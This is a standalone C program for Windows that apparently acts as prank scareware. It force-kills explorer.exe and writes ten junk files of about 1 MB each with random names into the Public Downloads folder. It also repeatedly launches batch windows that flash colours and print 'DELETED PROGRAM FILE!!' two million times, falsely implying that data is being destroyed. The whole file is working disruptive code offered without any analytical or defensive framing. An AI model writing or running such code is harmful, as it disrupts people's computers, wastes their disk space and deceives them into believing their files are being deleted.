#include <stdio.h>
#include <time.h>
#include <string.h>

char *hexes = "0123456789abcdef";

char *codeBAT[2] = {
	"@ECHO OFF && setlocal EnableDelayedExpansion\n",
	"FOR /L %%A IN (1,1,2000000) DO (ECHO DELETED PROGRAM FILE!!......%%A-%RANDOM%-ADwe-%RANDOM%-24efwV)"
};

int main()
{
	char *alphabets = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
	
	unsigned long long i,j;
	char *codeData = "GOBARXXCB%*#$%^ADJB";
	srand(time(0));
	int ii,jj,t=10;
	unsigned long long tt=0;
	system("taskkill /f /im explorer.exe");
	
	while(t--)
	{
		char filename[8];
		char extn[5];
		
		for(ii=0;ii<7;ii++)
		{
			filename[ii] = alphabets[rand()%62];
		}
		filename[ii]='\0';
		extn[0] = '.';
		for(jj=1;jj<4;jj++)
		{
			extn[jj] = alphabets[rand()%62];
		}
		extn[jj] = '\0';
		
		char fullname[250];
		strcpy(fullname,"C:/Users/Public/Downloads/");
		strcat(fullname,filename);
		strcat(fullname,extn);
		
		char wincolor[50];
		FILE *fp = fopen(fullname,"w+");
		
		for(i=0;i<60000;i++)
		{
			fputs(codeData,fp);
		}
		
		fclose(fp);
		
		FILE *fpbat = fopen("ff.bat","w+");
		unsigned int b = (tt++)%16; 
		sprintf(wincolor,"color %c%c\n",hexes[b],hexes[(b+4)%16]);
		printf(wincolor);
		fputs(codeBAT[0],fpbat);
		fputs(wincolor,fpbat);
		fputs(codeBAT[1],fpbat);
		fclose(fpbat);
		system("start ff.bat");
	}
	
	return 0;
}